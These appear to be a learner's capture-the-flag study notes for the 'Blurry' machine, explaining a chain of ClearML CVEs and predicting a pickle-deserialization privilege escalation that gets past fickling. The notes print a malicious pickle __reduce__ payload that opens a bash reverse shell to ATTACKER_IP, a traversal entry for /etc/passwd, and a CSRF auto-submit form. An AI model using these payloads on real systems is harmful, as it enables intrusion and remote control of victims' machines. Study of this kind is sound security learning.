
### About


---

- Blurry is a medium-difficulty Linux machine that features DevOps-related vectors surrounding machine learning.
- The foothold is comprised of a series of CVEs recently disclosed about the ClearML suite.
- The service provides a web platform, a fileserver, and an API; all of which contain vulnerabilities ([CVE-2024-24590](https://nvd.nist.gov/vuln/detail/CVE-2024-24590) - [CVE-2024-24595](https://nvd.nist.gov/vuln/detail/CVE-2024-24595)) that can be chained together for remote code execution.
- Once a shell on the target is obtained, a program that can be run with sudo is discovered.
- The program loads arbitrary PyTorch models to evaluate them against a protected dataset.
- While it is known that such models are susceptible to insecure deserialisation, fickling is used to scan the dataset for insecure pickle files, prior to loading the model.
- Malicious code can be injected into a model, using runpy to bypass the fickling checks.

---

## Pre-flight Begin

Before any CVE details are touched, preflight questions are to be completed first.
Prior knowledge only, 10 minutes.

---

**1. ClearML is an MLOps platform.** Without anything being looked up — what attack surface is an MLOps platform expected to expose? What services, what endpoints, what kinds of operations are likely performed?

**2. The description says "a web platform, a fileserver, and an API."** Which of those three surfaces is instinctively considered the most dangerous and why?

**3. Pickle deserialization has been performed twice now — Canape and the exploit development work on Laboratory.** What is the primitive? How is code execution achieved by a malicious pickle file?

**4. `fickling` is a static analysis tool that scans pickle files for unsafe opcodes.** Without its internal workings being known — what is the hypothesis for how `runpy` bypasses it? What property of `runpy` would make it invisible to a static scanner?

---

10 minutes. These four answers constitute the prediction document. What is known and what is uncertain is to be written — uncertainty is data too.

(2.5 hours were spent, with some of these topics and technologies being started from scratch)


**Formatted Q&A:**

---

**Q1:**
These four answers constitute the prediction document. What is known and what is uncertain is to be written — uncertainty is data too.

**A1:**
ClearML is new, and research of it, and of MLOps, is required.

---

**Q2:**
The description says "a web platform, a fileserver, and an API." Which of those three surfaces is instinctively considered the most dangerous and why?

**A2:**
The API is thought to be the most dangerous.
This view may be experience bias.
The usual API vulnerabilities such as IDOR and BFLA are present.
The "web platform" name is too broad and general; it could be anything.

---

**Q3:**
Pickle deserialization has been performed twice now — Canape and the exploit development work on Laboratory. What is the primitive? How is code execution achieved by a malicious pickle file?

**Reworded Q3 (for clarity):**
Python pickle deserialization has now been worked with on both **Canape** and during the Laboratory exploit development.
At its core, what is the dangerous primitive that makes pickle deserialization so powerful for an attacker?
In simple terms, how is remote code execution actually achieved by a malicious pickle file?

**A3:**
If the malicious pickle file can be augmented, and a payload, such as a reverse shell command, for example `/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'`, is inserted in the serialized object, and sent to / uploaded onto the server, and that reverse shell command can connect to the attacker's server.

---

**Q4:**
`fickling` is a static analysis tool that scans pickle files for unsafe opcodes.
Without its internal workings being known — what is the hypothesis for how `runpy` bypasses it?
What property of `runpy` would make it invisible to a static scanner?

**A4:**
`fickling` is new, and further research is needed.
If static analysis is performed, then it is assumed that it may be like Jaddix which is a static analysis tool for Android APKs.
And that maybe `fickling` works similarly.
Confusion was present regarding which one is the static analysis tool.
fickling or runpy??
Enough background is not possessed on any of this.

### Mentor Response

The answers are honest — that is exactly what preflight is for. The gaps are to be closed before the CVEs are read, so that they can be read with context instead of confusion.

---

## Quick fills — these are to be read, then research is to be conducted

**Q1 — ClearML / MLOps**

MLOps = Machine Learning Operations. It is analogous to DevOps but for ML models. ClearML is a platform where data scientists track experiments, store trained models, and share datasets. Attack surface intuition: anywhere files are uploaded, stored, and loaded by other users or automated processes. A model file that gets automatically loaded by a server is a deserialization trigger waiting to happen.

**Q2 — API most dangerous**

The instinct is good, and correct for the usual reasons. On this box the fileserver is equally important — because that is where model files live. The chain likely runs through the API so that a malicious file is gotten onto the fileserver, then something loads it.

**Q3 — The pickle primitive**

The payload was described correctly but the primitive was not. The dangerous primitive is `__reduce__`. When Python deserializes a pickle file, if the object has a `__reduce__` method, Python calls it automatically — no user interaction, no validation. An `os.system` call is returned from `__reduce__` and it is executed on deserialization. The reverse shell lives inside `__reduce__`, not injected separately.

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/IP/PORT 0>&1',))
```

That object is pickled. It is deserialized by the server. The shell is fired. That is the primitive.

**Q4 — fickling vs runpy**

`fickling` is the static analysis tool — it reads the pickle file's opcodes without executing it, looking for dangerous calls like `REDUCE` paired with `os.system` or `subprocess`. It is the defender.

`runpy` is Python's built-in module runner — it executes a Python module by name. The hypothesis question was: why would `runpy` be invisible to fickling? It is to be considered this way — fickling scans for dangerous _pickle opcodes_. If the payload does not use those opcodes directly, but instead uses a pickle opcode that calls `runpy`, which _then_ loads and executes code — the dangerous part is never seen by fickling. The malicious code isn't in the pickle file. It's in a module that `runpy` loads at runtime.

Static analysis can only see what's in the file. The danger is moved outside the file by `runpy`.

---

Enough context is now possessed for the CVEs to be read intelligently.

These four are to be read in order — the mechanism is to be skimmed for, not the CVSS score:

1. `https://nvd.nist.gov/vuln/detail/CVE-2024-24590`
2. `https://nvd.nist.gov/vuln/detail/CVE-2024-24591`
3. `https://nvd.nist.gov/vuln/detail/CVE-2024-24592`
4. `https://nvd.nist.gov/vuln/detail/CVE-2024-24593`

For each one, one sentence: what is permitted to be done? Those four sentences are to be returned and the prediction document is to be built.

---

# Further explanations with code snippets
**Expanded summaries for each CVE are provided**, with more technical detail and realistic code examples (based on the vulnerability descriptions and typical ClearML patterns). They were kept clear and analogies were used where helpful.

### **CVE-2024-24590 – Pickle Load on Artifact Get**

**Mechanism**:
ClearML allows users to upload “artifacts” (files, models, datasets). When another user calls `.get()` on an artifact that is a pickle file, the client code blindly deserializes it using Python’s `pickle.load()` without any safety checks.

**Code example (vulnerable usage on victim side)**:
```python
# Victim's code - this is what triggers the RCE
from clearml import Artifact

artifact = Artifact.get(project_name="my_project", name="malicious_model")
model = artifact.get()          # ← This does pickle.load() internally
```

**Attacker’s malicious pickle** (simplified):
```python
# Attacker creates this pickle file
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",))

exploit = Exploit()
with open("malicious.pkl", "wb") as f:
    pickle.dump(exploit, f)
```

**Analogy**: Same as the Python pickle RCE performed in **Canape** — the victim’s machine is essentially running whatever code was hidden inside the pickle by the attacker when the file is “loaded”.

---

### **CVE-2024-24591 – Path Traversal on File Download**

**Mechanism**:
In the `Datasets` class (specifically the `_download_external_files` method), ClearML takes a file path or URL from the dataset metadata and writes the downloaded file to disk **without sanitizing traversal sequences** (`../`).

**Code example (vulnerable pattern)**:
```python
# Vulnerable code inside ClearML client
def _download_external_files(self, dataset):
    for file_info in dataset.files:
        target_path = os.path.join(local_dir, file_info['path'])   # ← No sanitization!
        download_file(file_info['url'], target_path)               # Writes to attacker-controlled path
```

**Attacker’s malicious dataset entry**:
```json
{
  "path": "../../../etc/passwd",
  "url": "file:///etc/passwd"     # or a malicious external URL
}
```

**Analogy**: Exactly like the Path Traversal lab that was just solved — the app is thought to be writing a normal dataset file into a safe folder, but it is forced by the attacker to write (or read) anywhere on the filesystem.

---

### **CVE-2024-24592 – Improper Authentication on Fileserver**

**Mechanism**:
The ClearML **fileserver** component (usually running on port 8081) has **no authentication whatsoever** on its endpoints. Any unauthenticated user can read, upload, delete, or overwrite files.

**Code example (how an attacker abuses it)**:
```http
# No login required
GET  http://clearml-fileserver:8081/files/project/secret-model.pkl
PUT  http://clearml-fileserver:8081/files/project/malicious.pkl     # Upload evil pickle
DELETE http://clearml-fileserver:8081/files/project/victim-file
```

**Analogy**: A file server is imagined where every folder is wide open — no passwords, no tokens, no checks. Anyone on the network (or internet) can read or plant files in any project’s storage.

---

### **CVE-2024-24593 – Cross-Site Request Forgery (CSRF) on API/Server**

**Mechanism**:
The ClearML API and web server have **no CSRF tokens or same-origin checks** on any endpoints. Any logged-in user who visits a malicious webpage will have API requests sent on their behalf using their active session cookies.

**Code example (attacker’s malicious HTML page)**:
```html
<!-- Malicious page the victim is tricked into visiting -->
<form action="https://clearml-server/api/v2.0/projects/create" method="POST">
    <input name="name" value="Attacker Project">
    <input name="description" value="Owned by attacker">
</form>
<script>
    document.forms[0].submit();   // Automatically sends the request
</script>
```

**Analogy**: The server trusts any request that comes with valid cookies, even if the user never intended to send it (like someone forging a signature on a check).

---



**The expanded summaries for all four CVEs are provided**, with more detailed explanations, the code examples, and a clear statement of **what each one lets the attacker do**.

---

### **CVE-2024-24590 – Pickle Load on Artifact Get**

**Explanation**:
ClearML lets users upload “artifacts” (files, models, datasets, etc.). When another user calls the `.get()` method on an artifact, the ClearML client automatically deserializes it using Python’s built-in `pickle.load()`. There is **no validation or safe loading** — it blindly executes whatever code is embedded inside the pickle file.

**Code example (what happens on the victim’s machine)**:
```python
from clearml import Artifact

# Victim runs this innocent-looking code
artifact = Artifact.get(project_name="research", name="best_model")
model = artifact.get()          # ← This internally calls pickle.load()
```

**What this lets the attacker do**:
A malicious pickle file can be uploaded by the attacker that executes arbitrary code (reverse shell, data exfiltration, etc.) on **any victim’s machine** the moment they try to download and load the artifact. This is a classic insecure deserialization vulnerability, exactly like the ones that were exploited in Canape and Laboratory.

---

### **CVE-2024-24591 – Path Traversal on File Download**

**Explanation**:
In ClearML’s `Datasets` functionality, the code that downloads external files does not sanitize file paths. An attacker can specify a path containing `../` sequences (or even `file://` URLs). When the victim interacts with the dataset (e.g. calling `squash()`, `download()`, etc.), the file is written to whatever location the attacker chose on the victim’s filesystem.

**Code example (vulnerable pattern inside ClearML)**:
```python
# Inside ClearML client (simplified)
for file_info in dataset.files:
    target_path = os.path.join(local_dir, file_info['path'])   # No sanitization!
    download_file(file_info['url'], target_path)               # Writes anywhere
```

**Attacker’s malicious dataset entry**:
```json
{
  "path": "../../../etc/passwd",
  "url": "file:///etc/passwd"
}
```

**What this lets the attacker do**:
The victim’s machine can be forced by the attacker to write (or read) files to **any location** on the filesystem, including overwriting system files, stealing sensitive data, or placing malicious files in locations that will be executed later.

---

### **CVE-2024-24592 – Improper Authentication on Fileserver**

**Explanation**:
ClearML has a separate **fileserver** component (usually running on port 8081) that stores all uploaded artifacts, models, datasets, and user files. This fileserver has **no authentication at all** — any request to it is accepted without checking who the user is or whether they are logged in.

**Code example (attacker abusing the fileserver)**:
```http
# No login or token required
GET  http://clearml-fileserver:8081/files/project/secret-model.pkl
PUT  http://clearml-fileserver:8081/files/project/malicious.pkl     # Upload evil pickle
DELETE http://clearml-fileserver:8081/files/project/victim-file
```

**What this lets the attacker do**:
**Any file** stored on the ClearML server can be **read, uploaded, modified, or deleted** by the attacker, including other users’ private models, datasets, and artifacts. This gives them a very powerful way to plant malicious pickles or datasets that will later be used in the other CVEs.

---

### **CVE-2024-24593 – Cross-Site Request Forgery (CSRF) on API/Server**

**Explanation**:
The ClearML web server and API have **no CSRF protection** (no tokens, no same-origin checks). Any logged-in user who visits a malicious webpage will automatically send authenticated requests to the ClearML server using their active session cookies.

**Code example (attacker’s malicious webpage)**:
```html
<form action="https://clearml-server/api/v2.0/projects/create" method="POST">
    <input name="name" value="Attacker's Project">
    <input name="description" value="I own everything now">
</form>
<script>document.forms[0].submit();</script>
```

**What this lets the attacker do**:
A logged-in ClearML user can be tricked by the attacker into performing **any action** on their behalf (creating projects, inviting users, modifying settings, etc.) without the victim realizing it. This is a full account takeover vector if the victim has high privileges.

---


# One sentence each — what is permitted to be done?

**CVE-2024-24590 – Pickle Load on Artifact Get**
Allows an attacker to upload a malicious pickle file that can execute a reverse
shell, and perform data exfil,  on any victim’s machine


**CVE-2024-24591 – Path Traversal on File Download**
Allows attacker can force the victim’s machine to read or write  files to any where
on the filesystem, including overwriting system files and stealing sensitive
data.


**CVE-2024-24592 – Improper Authentication on Fileserver**
Allows attacker C.R.U.D-like abilities, (create, read upload, modify, or delete)
any file on the ClearML server


**CVE-2024-24593 – Cross-Site Request Forgery (CSRF) on API/Server**
Allows the attacker to trick a logged-in ClearML user into performing any action on their behalf.

---

# Explanation of How These Are Chained in an Attack

All four are accurate. They are now to be sharpened into a chain because these don't operate independently — they stack.

---

## The Chain — How They Connect

```
CVE-2024-24593 (CSRF)
        ↓
Force a logged-in user to make an authenticated request
        ↓
CVE-2024-24592 (No auth on fileserver)
        ↓
Upload a malicious pickle file to the fileserver
        ↓
CVE-2024-24591 (Path traversal)
        ↓
Control where the file lands on the filesystem
        ↓
CVE-2024-24590 (Pickle load on artifact get)
        ↓
Server deserializes the pickle → __reduce__ fires → RCE
```

Authenticated access is obtained via CSRF. Upload is permitted by the no-auth fileserver. Placement is controlled by path traversal. The trigger is pulled by pickle load.

---

The prediction document is now to be written. This is the preflight for Blurry — it is to be filled in cold based on everything that has been discussed:

```markdown
## Blurry Preflight Predictions

### Foothold
- Attack surface expected to be found:
- CVE chain order predicted:
- What the malicious payload is expected to look like:
- Where getting stuck is expected:

### Post-exploitation
- What the sudo program probably does:
- How fickling gets bypassed via runpy:
- Confidence level (1-10):

### Predicted rabbit holes to avoid:
```

It is to be filled in. This is the document against which reality is compared after the box is rooted.

---

# Blurry Preflight Predictions

---

**Table of Contents**
(what is being asked, and what is being predicted)

## Foothold
- Attack surface expected to be found:
- CVE chain order predicted:
- What the malicious payload is expected to look like:
- Where getting stuck is expected:

## Post-exploitation
- What the sudo program probably does:
- How fickling gets bypassed via runpy:
- Confidence level (1-10):

## Predicted rabbit holes to avoid:

---

**This is needed to be understood first, before this Preflight questionnaire can be completed.**
**ClearML is a Machine Learning Operations platform for the full ML lifecycle management.**

In practice, it helps teams:

- Track experiments (code version, hyperparameters, metrics, logs)
- Manage datasets and model artifacts (store/version/reuse files)
- Orchestrate training jobs on local or remote workers/agents
- Automate pipelines (training, evaluation, deployment workflows)
- Collaborate and reproduce results across a team

So, it is to be thought of as DevOps for machine learning: it brings structure, reproducibility, and automation to model development and deployment.

---

### Foothold
- **Attack surface expected to be found:**

What data comes in, who controls it, where it is consumed, and whether action can be taken with more privilege is being looked for.

1) Web UI:
Dashboard/features users click (projects, experiments, artifacts, settings, admin actions).

2) API
- Authn/authz enforcement per endpoint(s)
- IDOR/BOLA style object access
- Input handling on paths, artifact references, task metadata
- “Internal-only” endpoints accidentally reachable

3) Files / Artifact Service
- Upload permissions and ownership checks
- Path canonicalization (directory traversal class issues)
- Content-type/extension trust assumptions
- Download/get behavior that may trigger parsing/loading

4) Worker / Agent Behavior
- What agent auto-fetches and auto-executes
- Whether task metadata can influence execution context
- Boundary between “user-submitted job” and “host-level execution”
- Sandbox/isolation assumptions

5) Model Registry / Storage Path
- Who can register/promote/update model entries
- Whether registry entries point to arbitrary paths/artifacts
- Integrity checks before loading (hash/signature/trust policy)
- Deserialization sinks in model load path

6) ClearML functionality,
- version tracking, metrics and logs, datasets model artifacts
- A lack of validation or safe loading for deserialization is expected to be found.
- An absence of SOP Same Origin Policy, (would likely explain the CSRF vuln)

### End of Foothold ###

---

- **CVE chain order predicted:**

This CVE chain order is expected:
```
CVE-2024-24593 (CSRF)
        ↓
Force a logged-in user to make an authenticated request
        ↓
CVE-2024-24592 (No auth on fileserver)
        ↓
Upload a malicious pickle file to the fileserver
        ↓
CVE-2024-24591 (Path traversal)
        ↓
Control where the file lands on the filesystem
        ↓
CVE-2024-24590 (Pickle load on artifact get)
        ↓
Server deserializes the pickle → __reduce__ fires → RCE
```

- **What the malicious payload is expected to look like:**
A maliciously crafted pickle file containing a custom class instance engineered to execute arbitrary code during deserialization via `__reduce__`.

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',))

payload = pickle.dumps(Exploit())
```

- **Where getting stuck is expected:**
Some realistic friction points — auth/session flow, path normalization, getting the loader to touch the file, environment-specific triggers.

However, if past experience is any indicator of future performance, then it is predicted that **THE STICKIEST PART OF THIS ENTIRE BOX WILL BE CRAFTING, OR EDITING THE EXPLOIT TO WORK AS INTENDED.**

### Post-exploitation
- **What the sudo program probably does:**
The sudo program is a script that loads arbitrary PyTorch models to evaluate them against a protected dataset. It is probably something like `evaluate_model.py`. The privesc is: a malicious PyTorch model is given to it → it is deserialized as root → a shell as root is obtained.

- **How fickling gets bypassed via runpy:**
Static vs runtime.
What can be seen by static inspection? Vulnerable code can be seen, and dangerous patterns such as the dunder reduce method `__reduce__` calling `os.system`.

What does runtime module execution add that static analysis may miss?
Runtime module execution.

The pickle is scanned by fickling, the payload is hidden outside the pickle by runpy.

- **Confidence level (1-10):**
Each section is to be scored separately first:
foothold: 90%
chain: 90%
post-exploit: 40%

then average: 73

### Predicted rabbit holes to avoid:
- Working on a part of the web app, some feature or functionality, of which it is believed that a vulnerability is contained, but it doesn't.
- incorrectly crafting a payload
- Pursuing a false positive, or some other indicator



# End of Preflight Prediction
(suggested changes implemented)

---


# Approval — One Correction

The preflight is solid. It is good enough to start. It is to be scored quickly and the box is to be started.

---

## Quick Assessment

**Foothold (90% as scored)** — Justified. Attack surface analysis is thorough. CVE chain order is correct. Payload is correct.

**One correction on post-exploitation** — The sudo program isn't about ClearML admin privileges. The box description is to be re-read:

> *"A program that can be run with sudo loads arbitrary PyTorch models to evaluate them against a protected dataset."*

It is a script that loads PyTorch model files. That is it. Probably something like `evaluate_model.py`. The privesc is: a malicious PyTorch model is given to it → it is deserialized as root → a shell as root is obtained. The fickling bypass is how the safety check built into that script is gotten past.

**Post-exploit confidence should be lower** — maybe 40%, not 60%. This specific pattern has not been seen before. That is fine — the theory is known, the practice is to be taught by the box.




# Clearance to start the box is given.

Standard methodology — nmap first, writing is to be done as work proceeds, a return here is to be made when friction is hit or something is to be thought through.

One reminder: **debrief is to be completed within 24 hours of rooting.** That rule was established today for a reason.

It is to be obtained.

---
